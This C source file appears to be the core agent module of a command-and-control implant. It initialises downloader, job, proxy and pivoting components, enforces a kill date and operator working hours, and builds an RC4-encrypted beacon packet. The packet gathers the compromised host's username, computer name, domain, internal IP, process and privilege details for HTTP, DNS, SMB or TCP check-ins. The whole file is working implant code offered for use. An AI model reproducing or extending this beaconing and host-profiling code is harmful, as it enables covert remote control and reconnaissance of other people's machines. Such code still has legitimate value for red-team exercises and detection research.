#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Crypt.h"
#include <new>

Agent* Agent_Create()
{
	Agent* self = (Agent*)MemAllocLocal(sizeof(Agent));
	new (&self->Values) Map<CHAR*, LPVOID>();

	self->info        = AgentInfo_Create();
	self->config      = AgentConfig_Create();
	self->commander   = Commander_Create(self);
	self->downloader  = Downloader_Create(self->config->download_chunk_size);
	self->jober       = JobsController_Create();
	self->memorysaver = MemorySaver_Create();
	self->proxyfire   = Proxyfire_Create();
	self->pivotter    = Pivotter_Create();
	/* Global g_AsyncBofManager is created in MainAgent; avoid second Boffer with uninitialized Vector. */
	self->asyncBofMgr = NULL;

	self->SessionKey = (PBYTE) MemAllocLocal(16);
	for (int i = 0; i < 16; i++)
		self->SessionKey[i] = GenerateRandom32() % 0x100;
	
	self->Active = TRUE;
	return self;
}

BOOL Agent_IsActive(Agent* self)
{
	ULONG now = GetSystemTimeAsUnixTimestamp();
	return self->Active && !(self->config->kill_date && now >= self->config->kill_date);
}

ULONG Agent_GetWorkingSleep(Agent* self) 
{
    if ( !self->config->working_time )
        return 0;

    WORD endM   = (self->config->working_time >> 0) % 64;
    WORD endH   = (self->config->working_time >> 8) % 64;
    WORD startM = (self->config->working_time >> 16) % 64;
    WORD startH = (self->config->working_time >> 24) % 64;

	ULONG newSleepTime = 0;
	SYSTEMTIME SystemTime = { 0 };
    ApiWin->GetLocalTime(&SystemTime);

    if (SystemTime.wHour < startH) {
        newSleepTime = (startH - SystemTime.wHour) * 60 + (startM - SystemTime.wMinute);
    }
    else if (endH < SystemTime.wHour) {
        newSleepTime = (24 - SystemTime.wHour - 1) * 60 + (60 - SystemTime.wMinute);
        newSleepTime += startH * 60 + startM;
    }
    else if (SystemTime.wHour == startH && SystemTime.wMinute < startM) {
        newSleepTime = startM - SystemTime.wMinute;
    }
    else if (SystemTime.wHour == endH && endM <= SystemTime.wMinute) {
        newSleepTime = 23 * 60 + (60 + startM - SystemTime.wMinute);
    }
    else {
        return 0;
    }

    return newSleepTime * 60 - SystemTime.wSecond;
}

BYTE* Agent_BuildBeat(Agent* self, ULONG* size)
{
	BYTE flag = 0;
	flag += self->info->is_server; 
	flag <<= 1;
	flag += self->info->elevated;
	flag <<= 1;
	flag += self->info->sys64;
	flag <<= 1;
	flag += self->info->arch64;

	Packer* packer = Packer_Create();

	Packer_Pack32(packer, self->config->agent_type);
	Packer_Pack32(packer, self->info->agent_id);
	Packer_Pack32(packer, self->config->sleep_delay);
	Packer_Pack32(packer, self->config->jitter_delay);
	Packer_Pack32(packer, self->config->kill_date);
	Packer_Pack32(packer, self->config->working_time);
	Packer_Pack16(packer, self->info->acp);
	Packer_Pack16(packer, self->info->oemcp);
	Packer_Pack8(packer, self->info->gmt_offest);
	Packer_Pack16(packer, self->info->pid);
	Packer_Pack16(packer, self->info->tid);
	Packer_Pack32(packer, self->info->build_number);
	Packer_Pack8(packer, self->info->major_version);
	Packer_Pack8(packer, self->info->minor_version);
	Packer_Pack32(packer, self->info->internal_ip);
	Packer_Pack8(packer,  flag );
	Packer_PackBytes(packer, self->SessionKey, 16);
	Packer_PackBytes(packer, self->config->transport_salt, 16);
	Packer_PackStringA(packer, self->info->domain_name);
	Packer_PackStringA(packer, self->info->computer_name);
	Packer_PackStringA(packer, self->info->username);
	Packer_PackStringA(packer, self->info->process_name);

	EncryptRC4(Packer_data(packer), Packer_datasize(packer), self->config->encrypt_key, 16);

	MemFreeLocal((LPVOID*)&self->info->domain_name,   StrLenA(self->info->domain_name));
	MemFreeLocal((LPVOID*)&self->info->computer_name, StrLenA(self->info->computer_name));
	MemFreeLocal((LPVOID*)&self->info->username,      StrLenA(self->info->username));
	MemFreeLocal((LPVOID*)&self->info->process_name,  StrLenA(self->info->process_name));

	/* Beat buffer must outlive Packer_Destroy: copy off the packer heap, then destroy packer. */
#if defined(BEACON_HTTP) || defined(BEACON_DNS)

	ULONG beat_size = Packer_datasize(packer);
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
	if (!beat) {
		Packer_Destroy(packer);
		*size = 0;
		return NULL;
	}
	memcpy(beat, Packer_data(packer), beat_size);

#elif defined(BEACON_SMB)

	ULONG beat_size = Packer_datasize(packer) + 4;
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
	if (!beat) {
		Packer_Destroy(packer);
		*size = 0;
		return NULL;
	}
	memcpy(beat, &(self->config->listener_type), 4);
	memcpy(beat + 4, Packer_data(packer), Packer_datasize(packer));

#elif defined(BEACON_TCP)

	ULONG beat_size = Packer_datasize(packer) + 4;
	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
	if (!beat) {
		Packer_Destroy(packer);
		*size = 0;
		return NULL;
	}
	memcpy(beat, &(self->config->listener_type), 4);
	memcpy(beat + 4, Packer_data(packer), Packer_datasize(packer));

#endif

	Packer_Destroy(packer);

	*size = beat_size;
	return beat;
}
